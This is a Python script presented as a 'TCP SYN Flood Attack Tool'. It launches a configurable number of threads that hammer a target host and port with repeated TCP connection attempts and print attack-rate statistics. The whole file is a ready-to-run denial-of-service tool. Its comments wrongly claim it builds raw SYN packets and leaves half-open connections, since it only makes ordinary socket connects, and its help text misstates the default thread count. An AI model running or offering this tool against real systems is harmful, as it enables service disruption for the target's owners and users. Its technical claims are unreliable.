# tcp_syn_flood_attack.py
import socket
import threading
import random
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
import sys

class TCPSynFlood:
    def __init__(self, target_host, target_port, num_threads=100, delay=0.005):
        self.target_host = target_host
        self.target_port = target_port
        self.num_threads = num_threads
        self.delay = delay
        self.attack_running = True
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.start_time = None

    def create_syn_packet(self):
        """Create a raw socket for SYN packet"""
        try:
            # Create raw socket
            sock = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            # Set socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1)  # Set timeout to 1 second
            return sock
        except socket.error as e:
            print(f"Socket creation error: {e}")
            return None

    def syn_flood(self):
        """Single attack thread function"""
        while self.attack_running:
            try:
                # Create new socket for each attempt
                sock = self.create_syn_packet()
                if sock is None:
                    continue

                # Attempt to connect but don't complete the handshake
                sock.connect_ex((self.target_host, self.target_port))
                self.successful_attempts += 1
                
                # Close socket immediately to create half-open connection
                sock.close()
                
            except Exception as e:
                self.failed_attempts += 1
            
            self.total_attempts += 1
            time.sleep(self.delay)

    def print_stats(self):
        """Print attack statistics"""
        while self.attack_running:
            time.sleep(1)
            duration = time.time() - self.start_time
            attempts_per_second = self.total_attempts / duration
            print(f"\rAttempts: {self.total_attempts} | "
                  f"Successful: {self.successful_attempts} | "
                  f"Failed: {self.failed_attempts} | "
                  f"Rate: {attempts_per_second:.2f}/s", end='')

    def start_attack(self):
        """Start the TCP SYN flood attack"""
        print(f"Starting TCP SYN flood attack on {self.target_host}:{self.target_port}")
        print(f"Using {self.num_threads} threads")
        
        self.start_time = time.time()
        
        # Create thread pool for attack threads
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            # Start attack threads
            attack_futures = [
                executor.submit(self.syn_flood)
                for _ in range(self.num_threads)
            ]
            
            # Start stats printing thread
            stats_thread = threading.Thread(target=self.print_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            try:
                while True:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print("\nStopping attack...")
                self.attack_running = False
                for future in attack_futures:
                    future.cancel()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='TCP SYN Flood Attack Tool')
    parser.add_argument('--host', default='localhost',
                      help='Target host (default: localhost)')
    parser.add_argument('--port', type=int, default=5000,
                      help='Target port (default: 5000)')
    parser.add_argument('--threads', type=int, default=100,
                      help='Number of threads (default: 15)')
    parser.add_argument('--delay', type=float, default=0.005,
                      help='Delay between attempts in seconds (default: 0.005)')
    
    args = parser.parse_args()
    
    attack = TCPSynFlood(
        target_host=args.host,
        target_port=args.port,
        num_threads=args.threads,
        delay=args.delay
    )
    attack.start_attack()